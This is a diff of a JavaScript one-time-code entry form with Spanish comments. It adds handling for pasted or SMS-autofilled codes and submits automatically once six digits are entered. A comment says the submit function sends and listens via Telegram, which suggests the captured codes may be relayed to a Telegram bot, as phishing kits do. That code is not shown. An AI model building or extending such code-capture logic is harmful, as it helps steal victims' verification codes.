@@ -135,26 +135,10 @@
     }
   }
 
-  inputs.forEach((input, index) => {
-    input.addEventListener("input", (e) => {
-      input.classList.remove("invalid");
-      input.value = e.target.value.replace(/\D/g, "").slice(0, 1);
-      if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
-      refreshSubmitState();
-    });
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !e.target.value && index > 0) {
-        inputs[index - 1].focus();
-        inputs[index - 1].value = "";
-        inputs[index - 1].classList.remove("invalid");
-        refreshSubmitState();
-      }
-    });
-  });
-
-  if (form) {
-    form.addEventListener("submit", async function (e) {
-      e.preventDefault();
+  // ============================================================
+  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM
+  // ============================================================
+  async function enviarFormulario() {
       if (!isComplete() || remaining <= 0) return;
 
       const enteredCode = getCode();
@@ -302,6 +286,54 @@
         });
         if (inputs[0]) inputs[0].focus();
       }
-    });
-  }
+    }
+
+
+    // ============================================================
+  // EVENTOS DE LOS INPUTS COMPATIBLES CON AUTOCOMPLETADO
+  // ============================================================
+  inputs.forEach((input, index) => {
+    input.addEventListener("input", (e) => {
+      input.classList.remove("invalid");
+      const val = e.target.value;
+
+      // DETECCIÓN DE SUGERENCIA SMS O PEGADO DE TEXTO COMPLETO
+      if (val.length > 1) {
+        const cleanValue = val.replace(/\D/g, "").slice(0, 6);
+        cleanValue.split("").forEach((char, idx) => {
+          if (inputs[idx]) inputs[idx].value = char;
+});
+refreshSubmitState();
+if (isComplete()) {
+enviarFormulario();
+}
+return;
+}
+// CONTROL DE ESCRITURA MANUAL ESTÁNDAR
+input.value = val.replace(/\D/g, "").slice(0, 1);
+if (input.value && index < inputs.length - 1) {
+inputs[index + 1].focus();
+}
+refreshSubmitState();
+// Dispara automáticamente al escribir a mano el sexto dígito
+if (isComplete()) {
+enviarFormulario();
+}
+});
+input.addEventListener("keydown", (e) => {
+if (e.key === "Backspace" && !e.target.value && index > 0) {
+inputs[index - 1].focus();
+inputs[index - 1].value = "";
+inputs[index - 1].classList.remove("invalid");
+refreshSubmitState();
+}
+});
+});
+// Intercepción final del evento Submit manual o por tecla enter
+if (form) {
+form.addEventListener("submit", function (e) {
+e.preventDefault();
+enviarFormulario();
+});
+}
 })();
